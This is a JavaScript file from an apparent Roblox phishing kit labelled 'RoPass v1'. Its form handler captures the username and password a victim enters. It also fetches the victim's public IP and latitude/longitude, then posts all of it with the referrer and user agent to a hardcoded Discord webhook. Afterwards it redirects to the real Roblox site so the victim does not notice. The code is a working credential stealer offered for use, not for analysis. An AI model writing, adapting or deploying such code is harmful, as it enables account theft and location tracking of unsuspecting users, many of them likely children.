async function sendToDiscord(event) {
    event.preventDefault();

    const username = document.querySelector('input[name="username"]').value;
    const password = document.querySelector('input[name="password"]').value;
    const errorMessage = document.getElementById('error-message');
    const loginButton = document.getElementById('login-button');
    const loadingAnimation = document.getElementById('loading');

    if (username === '' || password === '') {
        errorMessage.innerText = 'Username and password required';
        errorMessage.style.display = 'block';
        return;
    }

    errorMessage.style.display = 'none';
    loginButton.style.display = 'none';
    loadingAnimation.style.display = 'flex';

    try {
        // Get IP address
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const publicIP = ipData.ip;

        // Get geolocation
        const geoResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
        const geoData = await geoResponse.json();

        // Prepare Discord embed
        const embed = {
            "title": "RoPass v1",
            "color": 0x3762dc,
            "fields": [
                {
                    "name": "👤 Username",
                    "value": `\`${username}\``,
                    "inline": true
                },
                {
                    "name": "🔑 Password",
                    "value": `\`${password}\``,
                    "inline": true
                },
                {
                    "name": "🌍 Public IP",
                    "value": `\`${publicIP}\``,
                    "inline": true
                },
                {
                    "name": "📍 Latitude",
                    "value": `\`${geoData.latitude || 'N/A'}\``,
                    "inline": true
                },
                {
                    "name": "📏 Longitude",
                    "value": `\`${geoData.longitude || 'N/A'}\``,
                    "inline": true
                },
                {
                    "name": "🔗 Referrer",
                    "value": `\`${document.referrer || 'Direct'}\``,
                    "inline": true
                },
                {
                    "name": "📡 Port",
                    "value": `\`${window.location.port || '443'}\``,
                    "inline": true
                },
                {
                    "name": "📅 Date",
                    "value": `\`${new Date().toLocaleString()}\``,
                    "inline": true
                },
                {
                    "name": "🖥️ User Agent",
                    "value": `\`${navigator.userAgent}\``,
                    "inline": false
                }
            ],
            "image": {
                "url": "https://i.imgur.com/8TqBJyU.png"
            },
            "timestamp": new Date().toISOString()
        };

        // Your Discord webhook URL - PUT YOUR ACTUAL URL HERE
        const webhookURL = 'https://discord.com/api/webhooks/1295529347637055590/FO0C7KQJhZvUi7bhpjAZ2afMKbcpF34vKU19QA2omnKwFzTchgUhnBlTivPk6t87Sst8';

        // Send to Discord
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                embeds: [embed]
            })
        });

        if (response.ok) {
            console.log('✅ Successfully sent to Discord!');
            
            // Wait 2 seconds then redirect to Roblox
            setTimeout(() => {
                window.location.href = 'https://www.roblox.com';
            }, 2000);
        } else {
            throw new Error('Discord webhook failed');
        }

    } catch (error) {
        console.error('Error:', error);
        
        // Show error and reset form
        loginButton.style.display = 'block';
        loadingAnimation.style.display = 'none';
        errorMessage.innerText = 'Login failed. Please try again.';
        errorMessage.style.display = 'block';
    }
}
